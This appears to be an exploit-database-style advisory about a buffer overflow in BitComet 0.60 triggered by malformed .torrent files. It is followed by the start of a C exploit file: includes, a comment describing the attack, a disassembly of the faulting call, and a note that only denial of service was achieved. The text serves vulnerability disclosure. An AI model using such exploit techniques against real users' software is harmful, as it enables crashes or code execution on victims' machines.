BitComet is prone to a buffer-overflow vulnerability.

This issue presents itself when the application attempts to process a malformed '.torrent' file.

Exploitation of this issue could allow attacker-supplied machine code to be executed in the context of the affected application.

BitComet 0.60 is reportedly vulnerable. Other versions may be affected as well.

#include <windows.h>
#include <stdio.h>

/*
* .::[ BitComet URI Buffer Overflow ]::.
*
* A vulnerability in BitComet, allows remote attackers construct a special .torrent file and put
* it on any BitTorrent publishing web site. When a user downloads the .torrent file and clicks
* on publishers name, BitComet will crash. An attacker can run arbitrary code on victims' host
* by specially crafted .torrent file.
*
* .text:0056057B                 mov     edx, [eax]
* .text:0056057D                 push    0
* .text:0056057F                 push    esi
* .text:00560580                 mov     ecx, eax
* .text:00560582                 call    dword ptr [edx+9Ch] <--- bug occurs here
*
* [Credits]: Fortinet Research
* [Notes]:      I could only do DoS because the EAX and ECX were only controlled, and were seperated by 0's.
